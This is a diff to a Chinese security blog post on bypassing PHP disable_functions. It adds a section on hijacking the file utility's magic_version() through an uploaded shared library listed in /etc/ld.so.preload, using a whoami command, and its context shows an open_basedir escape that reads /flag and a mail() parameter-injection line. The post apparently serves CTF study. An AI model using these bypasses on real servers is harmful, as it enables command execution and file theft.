@@ -25,8 +25,9 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://zer0peach.github.io/images/disable-function/image-20231102163700318.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/disable-function/image-20231102163759470.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/disable-function/image-20231123233111393.png">
 <meta property="article:published_time" content="2023-09-06T10:29:06.000Z">
-<meta property="article:modified_time" content="2023-11-13T06:43:22.520Z">
+<meta property="article:modified_time" content="2023-11-24T02:43:14.694Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/disable-function/image-20231102163700318.png">
@@ -234,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          25k 字
+          26k 字
         
       </span>
     
@@ -245,7 +246,7 @@
         
         
         
-          213 分钟
+          220 分钟
         
       </span>
     
@@ -923,8 +924,10 @@ int main() &#123;
         printf(&quot;%s&quot;, buf);
     &#125;
     ret = pclose(sendmail);
+    printf(&quot;%d&quot;, ret);
+    return 0;
+&#125;
 </code></pre></div>
-<p>​		<br>​		printf(“%d”, ret);<br>​		return 0;<br>​	}</p>
 <div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
 <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LANG=zh_CN.GBK&quot;</span>);
 <span class="hljs-comment">//ini_set(&#x27;mail.force_extra_parameters&#x27;,&#x27; -a;echo 1 &gt; /tmp/t&#x27;);</span>
@@ -1021,8 +1024,33 @@ int main() &#123;
 <p>要设置<code>ini_set(&#39;open_basedir&#39;,&#39;/&#39;)</code>才能访问<code>/</code>目录下的文件</p>
 <div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">mkdir</span>(&#x27;a&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;a&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;/&#x27;);<span class="hljs-built_in">readfile</span>(&#x27;/flag&#x27;);</code></pre></div>
 
+<h1 id="etc-ld-so-preload-考察文件上传到-etc"><a href="#etc-ld-so-preload-考察文件上传到-etc" class="headerlink" title="&#x2F;etc&#x2F;ld.so.preload      (考察文件上传到&#x2F;etc)"></a>&#x2F;etc&#x2F;ld.so.preload      (考察文件上传到&#x2F;etc)</h1><p><strong>利用 &#x2F;etc&#x2F;ld.so.preload</strong></p>
+<p>简单来说<code>/etc/ld.so.preload</code>是<code>LD_PRELOAD</code>的默认配置文件，所以跟LD_PRELOAD的优先级一样</p>
+<blockquote>
+<p>Linux 操作系统的动态链接库在加载过程中，动态链接器会先读取 LD_PRELOAD 环境变量和默认配置文件 <code>/etc/ld.so.preload</code>，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD 环境变量和 <code>/etc/ld.so.preload</code> 配置文件中指定的动态链接库依然会被装载，因为它们的优先级比 LD_LIBRARY_PATH 环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。</p>
+</blockquote>
+<div class="code-wrapper"><pre><code class="hljs routeros">file_check_res = subprocess.check_output(
+	[<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], 
+	<span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, 
+	<span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>,
+	<span class="hljs-attribute">timeout</span>=1
+)</code></pre></div>
 
+<p>查看 file 的源码 [<a target="_blank" rel="noopener" href="https://github.com/file/file/blob/master/src/file.c">https://github.com/file/file/blob/master/src/file.c</a> </p>
+<p>里面有个 <code>magic_version ()</code> 函数，没有任何参数，我们可以劫持这个函数</p>
+<p>跟LD_PRELOAD差不多，比如说mail()，然后在源码中找函数进行劫持</p>
+<div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
 
+<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">magic_version</span><span class="hljs-params">()</span> </span>&#123;
+    <span class="hljs-built_in">remove</span>(<span class="hljs-string">&quot;/etc/ld.so.preload&quot;</span>); <span class="hljs-comment">//without this, the exploit would recursively load .so</span>
+    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs fortran">gcc <span class="hljs-built_in">exp</span>.c -o <span class="hljs-built_in">exp</span>.so -<span class="hljs-keyword">shared</span> -fPIC</code></pre></div>
+
+<p>先上传so文件，然后<code>/etc/ld.so.preload</code>的内容为so文件的位置</p>
+<p><img src="/../images/disable-function/image-20231123233111393.png" srcset="/img/loading.gif" lazyload alt="image-20231123233111393"></p>
 
                 
               </div>
@@ -1208,26 +1236,9 @@ int main() &#123;
     <div class="beian">
   <span>
     <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
-      京ICP证123456号
+      
     </a>
   </span>
-  
-    
-      <span>
-        <a
-          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
-          rel="nofollow noopener"
-          class="beian-police"
-          target="_blank"
-        >
-          
-            <span style="visibility: hidden; width: 0">|</span>
-            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
-          
-          <span>京公网安备12345678号</span>
-        </a>
-      </span>
-    
   
 </div>
 
